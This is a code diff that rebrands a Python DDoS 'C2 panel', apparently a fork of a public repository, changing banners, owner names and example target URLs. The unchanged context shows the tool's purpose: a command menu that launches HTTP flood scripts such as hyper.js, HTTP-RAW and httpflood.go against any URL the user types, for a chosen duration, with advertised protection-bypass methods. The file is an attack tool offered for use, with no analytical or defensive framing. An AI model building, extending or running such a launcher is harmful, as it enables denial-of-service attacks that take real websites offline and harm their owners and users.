@@ -84,7 +84,7 @@ def ascii_vro():
     clear()
 
 def si():
-    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mZxC \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to m2h PN! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: m2hgamerz \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
+    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mM2H \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to m2H-DDoS  \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: m2hgamerz \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v2.0')
     print("")
 
 def tools():
@@ -213,20 +213,20 @@ def amp_games():
 
 
 def menu():
-    sys.stdout.write(f"         \x1b]2;ZxC C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
+    sys.stdout.write(f"         \x1b]2;M2H C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
     clear()
-    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mZxC \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to ZxC C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: zxcr9999 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
+    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mM2H \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to M2H-DDoS! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: m2hgamerz \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v2.0')
     print("")
     print("""
                         \x1b[38;2;0;212;14m╔═╗ \x1b[38;2;0;186;45m ═╗ ╦  ╔═\x1b[38;2;0;150;88m╗  ╔╦╗ \x1b[38;2;0;113;133m ╔╦╗ \x1b[38;2;0;83;168m ╔═╗ \x1b[38;2;0;49;147m ╔═╗
                         \x1b[38;2;0;212;14m╔═╝ \x1b[38;2;0;186;45m ╔╩╦╝  ║ \x1b[38;2;0;150;88m    ║║ \x1b[38;2;0;113;133m  ║║ \x1b[38;2;0;83;168m ║ ║ \x1b[38;2;0;49;147m ╚═╗
                         \x1b[38;2;0;212;14m╚═╝ \x1b[38;2;0;186;45m ╩ ╚═  ╚═\x1b[38;2;0;150;88m╝  ═╩╝ \x1b[38;2;0;113;133m ═╩╝ \x1b[38;2;0;83;168m ╚═╝ \x1b[38;2;0;49;147m ╚═╝
                 \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
-                \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to ZxC C2 DDoS Panel        \x1b[38;2;0;49;147m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - - - \x1b[38;2;239;239;239mFree DDoS Panel 2022\x1b[38;2;0;212;14m- - - - - - -\x1b[38;2;0;49;147m║
+                \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to M2H-DDoS DDoS Panel        \x1b[38;2;0;49;147m║
+                \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - - - \x1b[38;2;239;239;239mFree DDoS Panel By M2H 2022\x1b[38;2;0;212;14m- - - - - - -\x1b[38;2;0;49;147m║
                 \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
                     \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗
-                    \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mhttps://github.com/hoaan1995/ZxCDDoS \x1b[38;2;0;49;147m║
+                    \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mhttps://github.com/hoaan1995/M2H-DDoS \x1b[38;2;0;49;147m║
                     \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝
                 \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                 \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239m   Type help to see the all commands.      \x1b[38;2;0;49;147m║
@@ -236,7 +236,7 @@ def menu():
 def main():
     menu()
     while(True):
-        cnc = input('''\x1b[38;2;0;212;14m╔══[C2\x1b[38;2;0;186;45m@Z\x1b[38;2;0;150;88mx\x1b[38;2;0;113;133mC\x1b[38;2;0;49;147m]
+        cnc = input('''\x1b[38;2;0;212;14m╔══[M2\x1b[38;2;0;186;45mH\x1b[38;2;0;150;88mx\x1b[38;2;0;113;133m\x1b[38;2;0;49;147m]
 \x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
         if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
             layer7()
@@ -490,7 +490,7 @@ def main():
                 os.system(f'node hyper.js {url} {time}')
             except IndexError:
                 print('Usage: hyper <url> <time>')
-                print('Example: hyper http://vailon.com 60')
+                print('Example: hyper http://m2h.com 60')
                 
         elif "cf-socket" in cnc:
             try:
@@ -517,7 +517,7 @@ def main():
                 os.system(f'node HTTP-SOCKET {url} {per} {time}')
             except IndexError:
                 print('Usage: http-socket <url> <per> <time>')
-                print('Example: http-socket http://example.com 5000 60')
+                print('Example: http-socket http://m2h.com 5000 60')
 
         elif "http-raw" in cnc:
             try:
@@ -526,7 +526,7 @@ def main():
                 os.system(f'node HTTP-RAW {url} {time}')
             except IndexError:
                 print('Usage: http-raw <url> <time>')
-                print('Example: http-raw http://example.com 60')
+                print('Example: http-raw http://m2h.com 60')
 
         elif "http-requests" in cnc:
             try:
@@ -535,7 +535,7 @@ def main():
                 os.system(f'node HTTP-REQUESTS {url} {time}')
             except IndexError:
                 print('Usage: http-requests <url> <time>')
-                print('Example: http-requests http://example.org 60')
+                print('Example: http-requests http://m2h.org 60')
 
         elif "http-rand" in cnc:
             try:
@@ -544,7 +544,7 @@ def main():
                 os.system(f'node HTTP-RAND.js {url} {time}')
             except IndexError:
                 print('Usage: http-rand <url> <time>')
-                print('Example: http-rand http://vailon.com/ 60')
+                print('Example: http-rand http://m2h.com/ 60')
 
         elif "overflow" in cnc:
             try:
@@ -594,7 +594,7 @@ def main():
                 os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
             except IndexError:
                 print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
-                print('Example: httpflood http://example.com 15000 get 60')
+                print('Example: httpflood http://m2h.com 15000 get 60')
 
         elif "httpget" in cnc:
             try:
@@ -602,7 +602,7 @@ def main():
                 os.system(f'./httpget {url} 10000 50 100')
             except IndexError:
                 print('Usage: httpget <url>')
-                print('Example: httpget http://example.com')
+                print('Example: httpget http://m2h.com')
 
 # BANNERS
 
@@ -622,6 +622,7 @@ def main():
                 print('░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  ')
                 print('░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  ')
                 print('░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  ')
+                print('░░░░░░░░░░░░░░M2H░░░░░░░░░░░░░░░ ')
 
         elif "pikachu" in cnc:
                 print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
@@ -763,7 +764,7 @@ def login():
         print("⚡ shitt...!, you're so cute...")
         sys.exit(1)
     elif username == user and password == passwd:
-        print("⚡ Welcome to M2H!")
+        print("⚡ Welcome to M2H-DDoS Pannal!")
         time.sleep(0.3)
         ascii_vro()
         main()
